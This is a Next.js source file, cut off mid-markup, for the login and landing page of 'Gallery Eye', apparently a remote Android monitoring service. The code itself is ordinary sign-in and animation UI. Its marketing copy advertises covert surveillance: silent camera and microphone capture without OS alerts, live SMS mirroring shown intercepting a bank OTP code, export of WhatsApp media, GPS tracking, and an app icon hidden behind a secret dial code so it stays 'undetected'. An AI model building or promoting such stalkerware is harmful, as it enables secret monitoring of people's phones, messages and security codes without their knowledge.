'use client';

import React, { useState, useEffect, useRef } from 'react';
import { signIn } from 'next-auth/react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { motion, AnimatePresence } from 'framer-motion';
import VideoModal from '@/components/VideoModal';
import {
    ShieldCheck, Smartphone, Camera, MessageSquare, HardDrive,
    Lock, Zap, RefreshCw, Layers, CheckCircle2, ArrowRight,
    Play, Eye, Radio, Server, Wifi, ChevronRight, Terminal,
    Users, Download, Sliders, Activity, Bell, FileText
} from 'lucide-react';

export default function LoginPage() {
    // Auth State
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState('');
    const [mounted, setMounted] = useState(false);
    const router = useRouter();

    // Interactive 3D Simulator State
    const [activeTab, setActiveTab] = useState<'gallery' | 'camera' | 'sms' | 'stealth'>('gallery');
    const [is3dHovered, setIs3dHovered] = useState(false);

    useEffect(() => {
        setMounted(true);
    }, []);

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setError('');
        setIsLoading(true);
        const result = await signIn('credentials', {
            email,
            password,
            redirect: false,
        });
        setIsLoading(false);
        if (result?.ok) {
            router.push('/');
        } else {
            setError('Incorrect email or password. Please verify your credentials.');
        }
    };

    const scrollToSection = (id: string) => {
        const el = document.getElementById(id);
        if (el) {
            el.scrollIntoView({ behavior: 'smooth' });
        }
    };

    return (
        <main className="min-h-[100dvh] bg-[#050505] text-slate-100 selection:bg-emerald-500/30 selection:text-emerald-200 relative overflow-x-hidden font-sans">
            {/* Background Radial Orbs & Subtle Grid */}
            <div className="fixed inset-0 pointer-events-none z-0 overflow-hidden">
                <div className="absolute top-[-10%] left-[-10%] w-[50vw] h-[50vw] rounded-full bg-emerald-600/10 blur-[120px] animate-pulse" style={{ animationDuration: '8s' }} />
                <div className="absolute top-[30%] right-[-10%] w-[45vw] h-[45vw] rounded-full bg-cyan-600/10 blur-[140px] animate-pulse" style={{ animationDuration: '12s' }} />
                <div className="absolute bottom-[-10%] left-[20%] w-[55vw] h-[55vw] rounded-full bg-indigo-600/10 blur-[160px] animate-pulse" style={{ animationDuration: '10s' }} />
                <div
                    className="absolute inset-0 opacity-[0.03]"
                    style={{
                        backgroundImage: `linear-gradient(rgba(255,255,255,1) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,1) 1px, transparent 1px)`,
                        backgroundSize: '48px 48px',
                    }}
                />
            </div>

            {/* Floating Glass Island Navigation */}
            <header className="sticky top-4 z-50 px-4 sm:px-6">
                <nav className="mx-auto max-w-5xl rounded-full bg-black/60 backdrop-blur-2xl border border-white/10 px-4 sm:px-6 py-3 shadow-[0_20px_50px_rgba(0,0,0,0.7)] flex items-center justify-between transition-all">
                    <div className="flex items-center gap-3">
                        <div className="relative w-9 h-9 rounded-xl overflow-hidden border border-emerald-500/30 shadow-[0_0_15px_rgba(16,185,129,0.2)] flex items-center justify-center bg-black/80">
                            <Image
                                src="/gallery-eye-logo.jpg"
                                alt="Gallery Eye"
                                width={36}
                                height={36}
                                className="object-cover rounded-xl"
                            />
                        </div>
                        <div className="flex flex-col">
                            <span className="font-extrabold text-sm sm:text-base tracking-tight text-white flex items-center gap-2">
                                Gallery Eye
                                <span className="hidden sm:inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-[10px] text-emerald-400 font-medium">
                                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                                    E2E Vault
                                </span>
                            </span>
                        </div>
                    </div>

                    <div className="hidden md:flex items-center gap-8 text-sm font-medium text-slate-300">
                        <button onClick={() => scrollToSection('features')} className="hover:text-emerald-400 transition-colors">
                            Features
                        </button>
                        <button onClick={() => scrollToSection('simulator')} className="hover:text-emerald-400 transition-colors">
                            3D Simulator
                        </button>
                        <button onClick={() => scrollToSection('bento')} className="hover:text-emerald-400 transition-colors">
                            Architecture
                        </button>
                        <button onClick={() => scrollToSection('how-it-works')} className="hover:text-emerald-400 transition-colors">
                            How it Works
                        </button>
                    </div>

                    <div className="flex items-center gap-3">
                        <button
                            onClick={() => scrollToSection('auth-vault')}
                            className="group relative inline-flex items-center gap-2 rounded-full bg-emerald-500 px-5 py-2 text-xs sm:text-sm font-semibold text-white shadow-[0_0_25px_rgba(16,185,129,0.3)] hover:bg-emerald-400 hover:scale-[1.02] active:scale-[0.98] transition-all"
                        >
                            <span>Access Vault</span>
                            <span className="w-5 h-5 rounded-full bg-black/15 flex items-center justify-center group-hover:translate-x-0.5 transition-transform">
                                <ArrowRight className="w-3 h-3" />
                            </span>
                        </button>
                    </div>
                </nav>
            </header>

            {/* SECTION 1: ATTENTION (Cinematic Hero + Vault Login Engine) */}
            <section id="auth-vault" className="relative z-10 pt-10 pb-20 sm:pt-16 sm:pb-28 px-4 sm:px-6 max-w-7xl mx-auto">
                <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-8 items-center">
                    
                    {/* Left Copy Panel */}
                    <div className={`lg:col-span-7 flex flex-col items-start ${mounted ? 'animate-fade-in' : 'opacity-0'}`}>
                        <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-white/[0.04] border border-white/10 text-xs font-semibold uppercase tracking-wider text-emerald-400 mb-6 shadow-inner">
                            <ShieldCheck className="w-4 h-4 text-emerald-400" />
                            <span>Zero-Knowledge Remote Device Manager</span>
                        </div>

                        <h1 className="text-4xl sm:text-6xl lg:text-7xl font-extrabold tracking-tight text-white leading-[1.08] max-w-3xl mb-6">
                            Your device. <br />
                            <span className="bg-gradient-to-r from-emerald-400 via-cyan-400 to-indigo-400 bg-clip-text text-transparent">
                                Anywhere you are.
                            </span>
                        </h1>

                        <p className="text-base sm:text-lg text-slate-400 leading-relaxed max-w-xl mb-8">
                            Connect to your Android from any web browser worldwide. Sync gallery media, monitor live activity, capture stealth audio & video, and manage files instantly—all protected by military-grade end-to-end encryption.
                        </p>

                        {/* High-Impact Stats Strip */}
                        <div className="grid grid-cols-3 gap-4 sm:gap-6 w-full max-w-lg p-4 rounded-2xl bg-white/[0.02] border border-white/[0.07] mb-8">
                            <div className="flex flex-col">
                                <span className="text-xl sm:text-2xl font-black text-white">100%</span>
                                <span className="text-xs text-slate-400">Stealth Mode</span>
                            </div>
                            <div className="flex flex-col border-x border-white/10 px-4 sm:px-6">
                                <span className="text-xl sm:text-2xl font-black text-emerald-400">0.2s</span>
                                <span className="text-xs text-slate-400">Live Latency</span>
                            </div>
                            <div className="flex flex-col">
                                <span className="text-xl sm:text-2xl font-black text-cyan-400">AES-256</span>
                                <span className="text-xs text-slate-400">E2E Encryption</span>
                            </div>
                        </div>

                        <div className="flex flex-wrap items-center gap-4">
                            <button
                                onClick={() => scrollToSection('simulator')}
                                className="inline-flex items-center gap-2.5 px-6 py-3.5 rounded-xl bg-white/[0.06] hover:bg-white/[0.1] border border-white/10 font-semibold text-sm text-white transition-all hover:border-emerald-500/40 shadow-lg"
                            >
                                <Play className="w-4 h-4 text-emerald-400 fill-emerald-400" />
                                <span>Test 3D Simulator</span>
                            </button>
                            <button
                                onClick={() => scrollToSection('how-it-works')}
                                className="inline-flex items-center gap-2 px-6 py-3.5 rounded-xl font-semibold text-sm text-slate-400 hover:text-white transition-colors"
                            >
                                <span>Watch Video Guide</span>
                                <ChevronRight className="w-4 h-4" />
                            </button>
                        </div>
                    </div>

                    {/* Right Panel: Double-Bezel (Doppelrand) Vault Login Engine */}
                    <div className="lg:col-span-5 w-full max-w-md mx-auto lg:max-w-none">
                        <div className="p-2 rounded-[2.25rem] bg-gradient-to-b from-white/[0.08] via-white/[0.03] to-transparent border border-white/10 shadow-[0_30px_100px_rgba(0,0,0,0.8)]">
                            <div className="p-6 sm:p-8 rounded-[1.85rem] bg-[#0c0d10]/95 border border-white/[0.06] shadow-[inset_0_1px_1px_rgba(255,255,255,0.15)] backdrop-blur-3xl relative overflow-hidden">
                                
                                {/* Header inside login card */}
                                <div className="text-center mb-8">
                                    <div className="inline-flex items-center justify-center w-12 h-12 rounded-2xl bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 mb-4 shadow-[0_0_20px_rgba(16,185,129,0.15)]">
                                        <Lock className="w-6 h-6" />
                                    </div>
                                    <h2 className="text-2xl font-bold text-white tracking-tight">
                                        Vault Entry
                                    </h2>
                                    <p className="text-xs sm:text-sm text-slate-400 mt-1">
                                        Sign in to access your remote mission control
                                    </p>
                                </div>

                                {/* Google Sign-In Button */}
                                <button
                                    onClick={() => signIn('google', { callbackUrl: '/' })}
                                    className="w-full flex items-center justify-center gap-3 px-5 py-3.5 rounded-xl bg-white hover:bg-slate-100 text-slate-900 font-semibold text-sm transition-all hover:scale-[1.01] active:scale-[0.99] shadow-[0_4px_20px_rgba(255,255,255,0.15)] mb-6"
                                >
                                    <svg className="w-4 h-4" viewBox="0 0 24 24">
                                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
                                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
                                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" />
                                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" />
                                    </svg>
                                    <span>Continue with Google</span>
                                </button>

                                {/* Divider */}
                                <div className="flex items-center gap-4 mb-6">
                                    <div className="flex-1 h-px bg-white/10" />
                                    <span className="text-[11px] font-medium text-slate-500 uppercase tracking-widest">or email credentials</span>
                                    <div className="flex-1 h-px bg-white/10" />
                                </div>

                                {/* Email & Password Form */}
                                <form onSubmit={handleSubmit} className="flex flex-col gap-4">
                                    <div>
                                        <label className="block text-xs font-semibold text-slate-300 mb-2">
                                            Email Address
                                        </label>
                                        <input
                                            type="email"
                                            value={email}
                                            onChange={(e) => { setEmail(e.target.value); setError(''); }}
                                            placeholder="admin@galleryeye.io"
                                            required
                                            autoComplete="email"
                                            className="w-full px-4 py-3 rounded-xl bg-white/[0.04] border border-white/10 text-white placeholder-slate-500 text-sm outline-none focus:border-emerald-500/50 focus:bg-black/80 focus:shadow-[0_0_20px_rgba(16,185,129,0.15)] transition-all"
                                        />
                                    </div>

                                    <div>
                                        <label className="block text-xs font-semibold text-slate-300 mb-2">
                                            Vault Password
                                        </label>
                                        <input
                                            type="password"
                                            value={password}
                                            onChange={(e) => { setPassword(e.target.value); setError(''); }}
                                            placeholder="••••••••••••"
                                            required
                                            autoComplete="current-password"
                                            className="w-full px-4 py-3 rounded-xl bg-white/[0.04] border border-white/10 text-white placeholder-slate-500 text-sm outline-none focus:border-emerald-500/50 focus:bg-black/80 focus:shadow-[0_0_20px_rgba(16,185,129,0.15)] transition-all"
                                        />
                                    </div>

                                    {/* Error Notification */}
                                    {error && (
                                        <div className="p-3 rounded-xl bg-red-500/10 border border-red-500/20 text-xs text-red-300 flex items-center gap-2 animate-fade-in">
                                            <span className="w-2 h-2 rounded-full bg-red-500 flex-shrink-0 animate-ping" />
                                            <span>{error}</span>
                                        </div>
                                    )}

                                    <button
                                        type="submit"
                                        disabled={isLoading}
                                        className="w-full mt-2 py-3.5 px-6 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-500 text-white font-bold text-sm shadow-[0_10px_30px_rgba(16,185,129,0.3)] hover:shadow-[0_15px_40px_rgba(16,185,129,0.4)] transition-all hover:scale-[1.01] active:scale-[0.99] disabled:opacity-60 disabled:cursor-wait flex items-center justify-center gap-2"
                                    >
                                        {isLoading ? (
                                            <>
                                                <RefreshCw className="w-4 h-4 animate-spin text-white" />
                                                <span>Decrypting Session...</span>
                                            </>
                                        ) : (
                                            <>
                                                <span>Authorize Session</span>
                                                <ArrowRight className="w-4 h-4" />
                                            </>
                                        )}
                                    </button>
                                </form>

                                <div className="mt-6 pt-6 border-t border-white/[0.06] text-center">
                                    <p className="text-[11px] text-slate-500">
                                        Protected by Zero-Knowledge TLS 1.3 & WebSockets
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* SECTION 2: INTEREST (Interactive 3D Spatial Android Simulator) */}
            <section id="simulator" className="py-24 sm:py-32 px-4 sm:px-6 max-w-7xl mx-auto relative z-10 border-t border-white/10">
                <div className="text-center max-w-3xl mx-auto mb-16">
                    <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-500/10 border border-cyan-500/20 text-xs font-semibold text-cyan-400 uppercase tracking-widest mb-4">
                        <Activity className="w-3.5 h-3.5" />
                        <span>Interactive Mission Control</span>
                    </div>
                    <h2 className="text-3xl sm:text-5xl font-extrabold tracking-tight text-white mb-4">
                        Test the Real-Time Engine
                    </h2>
                    <p className="text-slate-400 text-base sm:text-lg">
                        Toggle live features below to preview how our zero-latency WebSockets synchronize media and hardware controls with your remote Android device right inside your browser.
                    </p>
                </div>

                {/* Simulator Tabs */}
                <div className="flex flex-wrap items-center justify-center gap-2 sm:gap-4 mb-12">
                    {[
                        { id: 'gallery', label: 'Gallery & Bulk Sync', icon: HardDrive, color: 'text-emerald-400', bg: 'bg-emerald-500/10' },
                        { id: 'camera', label: 'Stealth Camera & Mic', icon: Camera, color: 'text-cyan-400', bg: 'bg-cyan-500/10' },
                        { id: 'sms', label: 'Live SMS & Contacts', icon: MessageSquare, color: 'text-indigo-400', bg: 'bg-indigo-500/10' },
                        { id: 'stealth', label: 'Stealth Radar & GPS', icon: ShieldCheck, color: 'text-purple-400', bg: 'bg-purple-500/10' }
                    ].map((tab) => {
                        const Icon = tab.icon;
                        const isActive = activeTab === tab.id;
                        return (
                            <button
                                key={tab.id}
                                onClick={() => setActiveTab(tab.id as any)}
                                className={`flex items-center gap-2.5 px-5 py-3 rounded-2xl font-semibold text-xs sm:text-sm transition-all border ${
                                    isActive
                                        ? 'bg-white/[0.08] border-white/20 text-white shadow-[0_0_25px_rgba(255,255,255,0.07)] scale-105'
                                        : 'bg-white/[0.02] border-white/5 text-slate-400 hover:text-slate-200 hover:bg-white/[0.04]'
                                }`}
                            >
                                <div className={`w-7 h-7 rounded-xl flex items-center justify-center ${tab.bg} ${tab.color}`}>
                                    <Icon className="w-4 h-4" />
                                </div>
                                <span>{tab.label}</span>
                            </button>
                        );
                    })}
                </div>

                {/* 3D Floating Spatial Frame */}
                <div
                    className="w-full max-w-5xl mx-auto rounded-[2.5rem] p-3 sm:p-4 bg-gradient-to-b from-white/10 via-white/[0.04] to-transparent border border-white/10 shadow-[0_40px_120px_rgba(0,0,0,0.9)] perspective-1000"
                    onMouseEnter={() => setIs3dHovered(true)}
                    onMouseLeave={() => setIs3dHovered(false)}
                >
                    <motion.div
                        animate={{
                            rotateX: is3dHovered ? 2 : 0,
                            rotateY: is3dHovered ? -2 : 0,
                            scale: is3dHovered ? 1.008 : 1
                        }}
                        transition={{ type: "spring", stiffness: 250, damping: 25 }}
                        className="rounded-[2rem] bg-[#0c0d11] border border-white/[0.08] overflow-hidden shadow-2xl relative min-h-[460px] flex flex-col"
                    >
                        {/* Top Mock Window Bar */}
                        <div className="h-12 border-b border-white/[0.08] px-6 flex items-center justify-between bg-black/50">
                            <div className="flex items-center gap-2">
                                <div className="w-3 h-3 rounded-full bg-red-500/80" />
                                <div className="w-3 h-3 rounded-full bg-yellow-500/80" />
                                <div className="w-3 h-3 rounded-full bg-emerald-500/80" />
                                <span className="ml-3 text-xs font-mono text-slate-500 hidden sm:inline">mission-control://galleryeye.local/device-001</span>
                            </div>
                            <div className="flex items-center gap-3 text-xs font-mono">
                                <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-emerald-500/10 border border-emerald-500/20 text-emerald-400">
                                    <Wifi className="w-3 h-3" />
                                    <span>SOCKET_CONNECTED</span>
                                </span>
                                <span className="text-slate-400">BATTERY: 94%</span>
                            </div>
                        </div>

                        {/* Interactive Tab Body */}
                        <div className="flex-1 p-6 sm:p-10 relative flex items-center justify-center">
                            <AnimatePresence mode="wait">
                                {activeTab === 'gallery' && (
                                    <motion.div
                                        key="gallery"
                                        initial={{ opacity: 0, y: 15 }}
                                        animate={{ opacity: 1, y: 0 }}
                                        exit={{ opacity: 0, y: -15 }}
                                        transition={{ duration: 0.3 }}
                                        className="w-full grid grid-cols-1 md:grid-cols-12 gap-8 items-center"
                                    >
                                        <div className="md:col-span-5 space-y-4">
                                            <div className="inline-block px-3 py-1 rounded-lg bg-emerald-500/10 text-emerald-400 text-xs font-mono">
                                                INSTANT_MEDIA_STREAM
                                            </div>
                                            <h3 className="text-2xl sm:text-3xl font-bold text-white">
                                                Zero-Compression Photo & Video Vault
                                            </h3>
                                            <p className="text-sm text-slate-400 leading-relaxed">
                                                Browse all DCIM albums, WhatsApp media, and hidden folders directly over WebSocket. Export thousands of files at high-speed with 1-click ZIP packaging without draining your phone's CPU.
                                            </p>
                                            <div className="pt-2 flex items-center gap-4 text-xs font-semibold text-slate-300">
                                                <div className="flex items-center gap-2">
                                                    <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                                                    <span>Original Resolution</span>
                                                </div>
                                                <div className="flex items-center gap-2">
                                                    <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                                                    <span>Background Zip</span>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="md:col-span-7 grid grid-cols-2 sm:grid-cols-3 gap-3">
                                            {[1, 2, 3, 4, 5, 6].map((i) => (
                                                <div
                                                    key={i}
                                                    className="aspect-square rounded-2xl bg-white/[0.04] border border-white/10 p-2.5 flex flex-col justify-between hover:border-emerald-500/40 transition-all relative group overflow-hidden"
                                                >
                                                    <div className="absolute inset-0 bg-gradient-to-tr from-emerald-500/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity" />
                                                    <div className="flex justify-between items-start z-10">
                                                        <span className="text-[10px] font-mono text-slate-500">IMG_480{i}.JPG</span>
                                                        <span className="w-2 h-2 rounded-full bg-emerald-400" />
                                                    </div>
                                                    <div className="w-full h-1/2 rounded-xl bg-white/[0.05] border border-white/5 flex items-center justify-center text-slate-500 text-xs group-hover:scale-105 transition-transform">
                                                        <HardDrive className="w-5 h-5 text-emerald-400/80" />
                                                    </div>
                                                    <div className="flex justify-between items-center text-[10px] text-slate-400 z-10">
                                                        <span>4.8 MB</span>
                                                        <span className="text-emerald-400">SYNCED</span>
                                                    </div>
                                                </div>
                                            ))}
                                        </div>
                                    </motion.div>
                                )}

                                {activeTab === 'camera' && (
                                    <motion.div
                                        key="camera"
                                        initial={{ opacity: 0, y: 15 }}
                                        animate={{ opacity: 1, y: 0 }}
                                        exit={{ opacity: 0, y: -15 }}
                                        transition={{ duration: 0.3 }}
                                        className="w-full grid grid-cols-1 md:grid-cols-12 gap-8 items-center"
                                    >
                                        <div className="md:col-span-6 space-y-4">
                                            <div className="inline-block px-3 py-1 rounded-lg bg-cyan-500/10 text-cyan-400 text-xs font-mono">
                                                SILENT_HARDWARE_TRIGGER
                                            </div>
                                            <h3 className="text-2xl sm:text-3xl font-bold text-white">
                                                Stealth Front & Rear Camera + Mic
                                            </h3>
                                            <p className="text-sm text-slate-400 leading-relaxed">
                                                Capture photos remotely, record audio streams right into your browser, or trigger the device flashlight—all completely silently without turning on the device screen or triggering OS alerts.
                                            </p>
                                            <div className="grid grid-cols-2 gap-3 pt-2">
                                                <div className="p-3 rounded-xl bg-white/[0.04] border border-white/10 flex items-center gap-3">
                                                    <Camera className="w-5 h-5 text-cyan-400" />
                                                    <span className="text-xs font-semibold text-white">Silent Snapshot</span>
                                                </div>
                                                <div className="p-3 rounded-xl bg-white/[0.04] border border-white/10 flex items-center gap-3">
                                                    <Radio className="w-5 h-5 text-emerald-400" />
                                                    <span className="text-xs font-semibold text-white">Live Audio Feed</span>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="md:col-span-6 w-full rounded-2xl bg-black/80 border border-cyan-500/30 p-6 shadow-2xl relative overflow-hidden flex flex-col items-center justify-center min-h-[260px]">
                                            <div className="absolute top-4 left-4 flex items-center gap-2 px-2.5 py-1 rounded-md bg-red-500/20 border border-red-500/30 text-[11px] font-mono text-red-400 animate-pulse">
                                                <span className="w-2 h-2 rounded-full bg-red-500" />
                                                <span>REC // STEALTH_STREAM_ACTIVE</span>
                                            </div>
                                            <div className="w-20 h-20 rounded-full border-2 border-dashed border-cyan-500/40 flex items-center justify-center mb-4 animate-spin" style={{ animationDuration: '20s' }}>
                                                <Eye className="w-8 h-8 text-cyan-400" />
                                            </div>
                                            <span className="text-xs font-mono text-slate-400">Rear Camera (Wide 48MP) · Silent Capture Ready</span>
                                            {/* Audio Waveform Simulator */}
                                            <div className="flex items-center gap-1.5 mt-6">
                                                {[30, 60, 45, 80, 100, 50, 70, 90, 40, 65, 85, 30].map((h, i) => (
                                                    <motion.div
                                                        key={i}
                                                        animate={{ height: [12, h, 12] }}
                                                        transition={{ duration: 1 + (i % 3) * 0.4, repeat: Infinity, ease: "easeInOut" }}
                                                        className="w-1.5 bg-cyan-400/80 rounded-full"
                                                    />
                                                ))}
                                            </div>
                                        </div>
                                    </motion.div>
                                )}

                                {activeTab === 'sms' && (
                                    <motion.div
                                        key="sms"
                                        initial={{ opacity: 0, y: 15 }}
                                        animate={{ opacity: 1, y: 0 }}
                                        exit={{ opacity: 0, y: -15 }}
                                        transition={{ duration: 0.3 }}
                                        className="w-full grid grid-cols-1 md:grid-cols-12 gap-8 items-center"
                                    >
                                        <div className="md:col-span-5 space-y-4">
                                            <div className="inline-block px-3 py-1 rounded-lg bg-indigo-500/10 text-indigo-400 text-xs font-mono">
                                                LIVE_COMMUNICATIONS_FEED
                                            </div>
                                            <h3 className="text-2xl sm:text-3xl font-bold text-white">
                                                Real-Time SMS & Contacts Mirror
                                            </h3>
                                            <p className="text-sm text-slate-400 leading-relaxed">
                                                Monitor incoming and stored text messages instantly. Search your entire address book remotely and receive verification notifications without holding the physical device.
                                            </p>
                                        </div>
                                        <div className="md:col-span-7 space-y-3">
                                            {[
                                                { sender: '+1 (415) 890-3492', body: 'Your Bank Security verification code is: 849-204. Do not share this with anyone.', time: '2m ago', tag: 'OTP ALERT' },
                                                { sender: 'Contact: Alex Rivera', body: 'Hey, I just shared the meeting slides on WhatsApp. Check the gallery folder!', time: '14m ago', tag: 'INCOMING' },
                                                { sender: '+44 7700 900077', body: 'Package delivery scheduled for 14:30 today at gate entrance.', time: '1h ago', tag: 'LOGISTICS' }
                                            ].map((msg, idx) => (
                                                <div key={idx} className="p-4 rounded-2xl bg-white/[0.04] border border-white/10 hover:border-indigo-500/40 transition-all flex flex-col gap-2">
                                                    <div className="flex items-center justify-between">
                                                        <span className="text-xs font-bold text-white font-mono">{msg.sender}</span>
                                                        <div className="flex items-center gap-2">
                                                            <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-indigo-500/10 text-indigo-400">{msg.tag}</span>
                                                            <span className="text-[11px] text-slate-500">{msg.time}</span>
                                                        </div>
                                                    </div>
                                                    <p className="text-xs text-slate-300 leading-relaxed">{msg.body}</p>
                                                </div>
                                            ))}
                                        </div>
                                    </motion.div>
                                )}

                                {activeTab === 'stealth' && (
                                    <motion.div
                                        key="stealth"
                                        initial={{ opacity: 0, y: 15 }}
                                        animate={{ opacity: 1, y: 0 }}
                                        exit={{ opacity: 0, y: -15 }}
                                        transition={{ duration: 0.3 }}
                                        className="w-full grid grid-cols-1 md:grid-cols-12 gap-8 items-center"
                                    >
                                        <div className="md:col-span-6 space-y-4">
                                            <div className="inline-block px-3 py-1 rounded-lg bg-purple-500/10 text-purple-400 text-xs font-mono">
                                                ZERO_FOOTPRINT_RADAR
                                            </div>
                                            <h3 className="text-2xl sm:text-3xl font-bold text-white">
                                                App Icon Hiding & Ghost Mode
                                            </h3>
                                            <p className="text-sm text-slate-400 leading-relaxed">
                                                Activate Stealth Radar to hide the Gallery Eye companion app completely from the Android app drawer and launcher. Operates silently as a system service with minimal battery footprint.
                                            </p>
                                            <div className="p-4 rounded-2xl bg-purple-500/10 border border-purple-500/20 text-xs text-purple-300 flex items-center justify-between">
                                                <span>Launcher Icon Visibility:</span>
                                                <span className="font-mono font-bold px-2 py-1 bg-black/40 rounded text-emerald-400">HIDDEN (GHOST_MODE)</span>
                                            </div>
                                        </div>
                                        <div className="md:col-span-6 flex items-center justify-center">
                                            <div className="relative w-64 h-64 rounded-full border border-purple-500/30 flex items-center justify-center bg-radial from-purple-900/20 to-transparent">
                                                <div className="absolute w-44 h-44 rounded-full border border-purple-500/20 animate-ping" style={{ animationDuration: '4s' }} />
                                                <div className="absolute w-28 h-28 rounded-full border border-purple-500/40" />
                                                <div className="w-14 h-14 rounded-2xl bg-purple-600 flex items-center justify-center shadow-[0_0_40px_rgba(168,85,247,0.5)] z-10">
                                                    <ShieldCheck className="w-8 h-8 text-white" />
                                                </div>
                                                <div className="absolute top-8 right-12 px-2 py-1 rounded bg-black/80 border border-emerald-500/30 text-[10px] font-mono text-emerald-400">
                                                    STATUS: UNDETECTED
                                                </div>
                                            </div>
                                        </div>
                                    </motion.div>
                                )}
                            </AnimatePresence>
                        </div>
                    </motion.div>
                </div>
            </section>

            {/* SECTION 3: DESIRE (The Gapless Bento Grid - Double-Bezel Doppelrand Architecture) */}
            <section id="features" className="py-24 sm:py-36 px-4 sm:px-6 max-w-7xl mx-auto relative z-10">
                <div className="flex flex-col md:flex-row md:items-end justify-between gap-6 mb-16">
                    <div>
                        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-xs font-semibold text-emerald-400 uppercase tracking-widest mb-4">
                            <Layers className="w-3.5 h-3.5" />
                            <span>System Architecture</span>
                        </div>
                        <h2 className="text-3xl sm:text-5xl font-extrabold tracking-tight text-white">
                            Engineered Without Compromise
                        </h2>
                    </div>
                    <p className="text-slate-400 text-sm sm:text-base max-w-md">
                        Every tool inside Gallery Eye is designed for zero latency, complete anonymity, and high-throughput data processing across all Android versions.
                    </p>
                </div>

                {/* Gapless Bento Grid (`grid-flow-dense`) */}
                <div className="grid grid-cols-1 md:grid-cols-12 grid-flow-dense gap-6">
                    
                    {/* Bento Card 1: Large Featured (Col 8, Row 2) */}
                    <div className="md:col-span-8 p-2 rounded-[2.25rem] bg-white/[0.03] border border-white/10 hover:border-emerald-500/40 transition-all group shadow-xl">
                        <div className="h-full p-8 sm:p-10 rounded-[1.85rem] bg-[#0c0d10] border border-white/[0.06] shadow-[inset_0_1px_1px_rgba(255,255,255,0.12)] flex flex-col justify-between relative overflow-hidden">
                            <div className="absolute top-0 right-0 w-96 h-96 bg-emerald-500/10 rounded-full blur-[100px] pointer-events-none group-hover:bg-emerald-500/20 transition-all" />
                            
                            <div className="flex items-center justify-between mb-12">
                                <span className="px-3.5 py-1.5 rounded-xl bg-white/[0.06] border border-white/10 text-xs font-mono font-bold text-emerald-400">
                                    01 // ZERO-LATENCY ENGINE
                                </span>
                                <HardDrive className="w-8 h-8 text-emerald-400/80" />
                            </div>

                            <div className="space-y-4 max-w-xl z-10">
                                <h3 className="text-2xl sm:text-4xl font-extrabold text-white tracking-tight">
                                    Instant Gallery Mirroring & High-Speed Bulk ZIP Export
                                </h3>
                                <p className="text-sm sm:text-base text-slate-400 leading-relaxed">
                                    Never wait for cloud upload queues again. Gallery Eye streams media directly over encrypted peer-to-peer WebSockets, letting you browse thousands of 4K photos and instantly bundle entire directories into clean ZIP archives.
                                </p>
                            </div>

                            <div className="mt-8 pt-8 border-t border-white/[0.06] grid grid-cols-3 gap-4 text-xs font-mono text-slate-400">
                                <div>DCIM / Camera Sync</div>
                                <div>WhatsApp & Telegram Media</div>
                                <div>Hidden Vault Albums</div>
                            </div>
                        </div>
                    </div>

                    {/* Bento Card 2: Stealth Hiding (Col 4) */}
                    <div className="md:col-span-4 p-2 rounded-[2.25rem] bg-white/[0.03] border border-white/10 hover:border-cyan-500/40 transition-all group shadow-xl">
                        <div className="h-full p-6 sm:p-8 rounded-[1.85rem] bg-[#0c0d10] border border-white/[0.06] shadow-[inset_0_1px_1px_rgba(255,255,255,0.12)] flex flex-col justify-between relative overflow-hidden">
                            <div className="flex items-center justify-between mb-8">
                                <span className="px-3 py-1 rounded-lg bg-white/[0.06] border border-white/10 text-xs font-mono font-bold text-cyan-400">
                                    02 // STEALTH
                                </span>
                                <ShieldCheck className="w-7 h-7 text-cyan-400/80" />
                            </div>
                            <div className="space-y-3 z-10">
                                <h3 className="text-xl sm:text-2xl font-bold text-white">
                                    Total App Disappearance
                                </h3>
                                <p className="text-xs sm:text-sm text-slate-400 leading-relaxed">
                                    Hide the companion app icon completely from the Android launcher and settings menu with custom secret dial-code activation.
                                </p>
                            </div>
                            <div className="mt-6 p-3 rounded-xl bg-cyan-500/10 border border-cyan-500/20 text-xs font-mono text-cyan-300 flex items-center justify-between">
                                <span>Dial Trigger:</span>
                                <span>*#*#1234#*#*</span>
                            </div>
                        </div>
                    </div>

                    {/* Bento Card 3: Hardware Control (Col 4) */}
                    <div className="md:col-span-4 p-2 rounded-[2.25rem] bg-white/[0.03] border border-white/10 hover:border-purple-500/40 transition-all group shadow-xl">
